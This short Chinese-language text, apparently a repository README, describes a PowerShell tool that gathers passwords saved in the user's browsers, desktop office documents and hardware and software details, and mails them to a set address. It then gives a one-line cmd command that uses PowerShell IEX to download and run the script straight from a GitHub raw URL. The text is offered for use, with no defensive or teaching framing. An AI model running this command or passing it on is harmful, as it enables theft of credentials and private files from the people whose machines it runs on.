利用powershell收集用户浏览器中保存的密码，桌面办公文件，电脑硬件软件信息。发送到指定邮

cmd中调用

powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/wangyongquan/powershell/master/lesgo.ps1');